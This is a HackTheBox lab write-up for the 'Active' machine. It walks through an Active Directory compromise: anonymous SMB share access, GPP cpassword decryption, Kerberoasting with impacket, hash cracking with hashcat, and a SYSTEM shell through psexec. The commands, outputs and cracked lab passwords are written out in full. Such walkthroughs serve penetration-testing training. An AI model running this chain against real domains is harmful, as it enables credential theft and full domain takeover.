# 📝 HTB — Active

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows — Active Directory  
**Attack Path:** SMB Anonymous → GPP cpassword → Kerberoasting → PSExec → Domain Admin

---

## Machine Info

| Field | Value |
|-------|-------|
| IP | 10.10.10.100 |
| Domain | active.htb |
| DC Hostname | ACTIVE |
| OS | Windows Server 2008 R2 SP1 |
| Key Techniques | GPP cpassword (MS14-025), Kerberoasting, PSExec PTH |

---

## Environment Setup

```bash
export ip=10.10.10.100
export domain=active.htb
echo "$ip active.htb" >> /etc/hosts
mkdir -p scan enum creds loot
```

---

## Phase 1 — Recon

```bash
nmap -p- -T4 --min-rate=1000 -oN scan/nmap-full.txt $ip
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,49152,49153,49154,49155,49157,49158 \
  -sV -sC -oN scan/nmap-svc.txt $ip
```

**Key open ports:**

```
53    DNS
88    Kerberos
135   RPC
139/445 SMB
389   LDAP
# OS: Windows Server 2008 R2 SP1
# Domain: active.htb
```

---

## Phase 2 — SMB Enumeration (No Creds)

```bash
# List shares anonymously
smbclient -L //$ip -N
nxc smb $ip -u '' -p '' --shares
```

**Shares discovered:**

```
ADMIN$     → No access
C$         → No access
IPC$       → READ ONLY
NETLOGON   → No access
Replication → READ ONLY  ← interesting
SYSVOL     → No access
Users      → No access
```

```bash
# Access Replication share anonymously
smbclient //$ip/Replication -N

# Recursively download everything
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

---

## Phase 3 — GPP cpassword (MS14-025)

Browsing the Replication share reveals a `Groups.xml` file:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/
  Preferences/Groups/Groups.xml
```

**Contents of Groups.xml:**

```xml
<Groups clsid="{...}">
  <User clsid="{...}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
        uid="{...}">
    <Properties action="U" newName="" fullName="" description=""
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

```bash
# Decrypt cpassword using gpp-decrypt
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
# Result: GPPstillStandingStrong2k18

# Verify credentials
nxc smb $ip -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```

---

## Phase 4 — Kerberoasting

```bash
export user=SVC_TGS
export pass='GPPstillStandingStrong2k18'

# Request TGS for SPN accounts
sudo impacket-GetUserSPNs $domain/$user:$pass -dc-ip $ip \
  -request -outputfile creds/kerb-hashes.txt

# SPN found: active/CIFS:445 → Administrator account
```

**Hash captured:**

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$...hash...
```

```bash
# Crack TGS hash
sudo hashcat -m 13100 creds/kerb-hashes.txt /usr/share/wordlists/rockyou.txt
# Result: Administrator : Ticketmaster1968
```

---

## Phase 5 — Domain Admin

```bash
export admpass='Ticketmaster1968'

# Verify
nxc smb $ip -u administrator -p $admpass

# Get SYSTEM shell via PSExec
sudo impacket-psexec active.htb/administrator:'Ticketmaster1968'@$ip
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
[ROOT FLAG]

C:\Users\SVC_TGS\Desktop> type user.txt
[USER FLAG]
```

---

## Attack Chain Summary

```
nmap → open ports (53, 88, 445, 389)
  ↓
SMB anonymous → Replication share accessible
  ↓
Groups.xml found → cpassword attribute
  ↓
gpp-decrypt → SVC_TGS : GPPstillStandingStrong2k18
  ↓
impacket-GetUserSPNs → Administrator SPN → TGS hash
  ↓
hashcat -m 13100 → Administrator : Ticketmaster1968
  ↓
impacket-psexec → SYSTEM
```

---

## Key Takeaways

```
1. Anonymous SMB access should always be checked — even read-only shares can contain gold
2. GPP cpassword (MS14-025) — patch from 2014, still appears in real environments
3. If the Administrator account itself has a SPN set → Kerberoast → direct DA compromise
4. gpp-decrypt is built into Kali — always check Groups.xml when SYSVOL / Replication accessible
```

---

**MITRE ATT&CK:** T1552.006 (GPP Credentials) · T1558.003 (Kerberoasting) · T1021.002 (SMB / Windows Admin Shares)

[← Back to Writeups](README.md)
